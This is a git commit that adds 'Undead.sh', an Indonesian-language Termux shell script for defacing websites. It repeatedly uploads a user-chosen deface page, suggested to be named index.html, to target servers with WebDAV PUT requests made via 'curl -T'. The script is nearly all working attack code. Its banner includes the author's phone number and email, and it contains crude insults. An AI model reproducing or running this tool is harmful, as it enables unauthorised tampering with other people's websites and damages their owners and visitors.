edb2ec6fe87040e6505b0bac188cf5e08b92714f
Mrs0sTamvan <Mr.s0sTamvan@gmail.com>
2018-11-01 18:59:15 +0700

    Upload di Github

---
+++ Undead.sh
@@ -0,0 +1,120 @@
+#system/bin/sh
+#.::Undead Slayer::.
+#Haha Lu Mo Recode
+#Ga Malu Lu sama Jembod
+
+#variables
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+
+echo -e $cyan ""
+figlet -f standard ".::UNDEAD.S::."
+echo $cyan"Tools Ini Fungsi nya Untuk Depes Mamang, Kalo Mau Tebas Index Namain Sc Lu Index.html coeg"
+
+echo "╔═════════════════════════════════════════════════════════════════════════════╗"
+echo "║╔═══════════════════════════════════════════════════════════════════════════╗║"
+echo "║║[÷]Author     : .::Undead::.                                               ║║"
+echo "║║                                                                           ║║"
+echo "║║[÷]Thanks To  : I.T.A - 2E4H - G.C.T - BlackHole Security                  ║║"
+echo "║║                                                                           ║║"
+echo "║║[÷]Contact Me : 08878819132                                                ║║"
+echo "║║                                                                           ║║"
+echo "║║[÷]E-Mail     : Mr.s0sTamvan@gmail.com                                     ║║"
+echo "║║                                                                           ║║"
+echo "║║[÷]Tools      : Tools Webdav                                               ║║"
+echo "║║                                                                           ║║"
+echo "║║[÷]Bio        : Gua Jones Anjeeng :( , Ngapa lu Ketawain Gua Gua Hek       ║║"
+echo "║║                Otak Lu Mau kagak?, Ga Mau Kan!!, Mangkannya Jan           ║║"
+echo "║║                Ketawain Gua Anjeeng:(                                     ║║"
+echo "║╚═══════════════════════════════════════════════════════════════════════════╝║"
+echo "╚═════════════════════════════════════════════════════════════════════════════╝"
+
+
+##############################
+# CTRL C
+#############################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo $cyan"[×]Ctrl-C terdeteksi cuk..."
+sleep 1
+echo ""
+echo $cyan"[×]Thanks ea Bangsad:)"
+sleep 1
+echo ""
+echo $cyan"[×]Bye-Bye ea Cok...."
+sleep 3
+echo ""
+echo $red"┏━┳┳┳━┳┳┓"
+echo $red"┃━┫┃┃┏┫━┫┏┓"
+echo $red"┃┏┫┃┃┗┫┃┃┃┃"
+echo $red"┗┛┗━┻━┻┻┛┃┃"
+echo $red"┏┳┳━┳┳┳┓┏┫┣┳┓"
+echo $red"┃┃┃┃┃┃┃┃┣┻┫┃┃"
+echo $red"┣┓┃┃┃┃┣┫┃┏┻┻┫"
+echo $red"┗━┻━┻━┻ANJING"
+sleep 5
+exit
+}
+echo ""
+echo $yellow"Masukin Nama Sc nya, Inget Harus di luar folder"
+read -p "[+]" cok;
+echo $red"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $blue"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $yellow"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $cyan"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $purple"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+ho $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $white"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $red"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $blue"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+echo -e $green"Target nya cok"
+read -p "[+]" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $blue"::::::::::::::::::::Undead Slayer::::::::::::::::::"
+
+echo ""
+echo $cyan"Cara Mengaksesnya Ketik Http://target.com/namaSclu.html"
+echo $cyan"Thanks Semoanya"
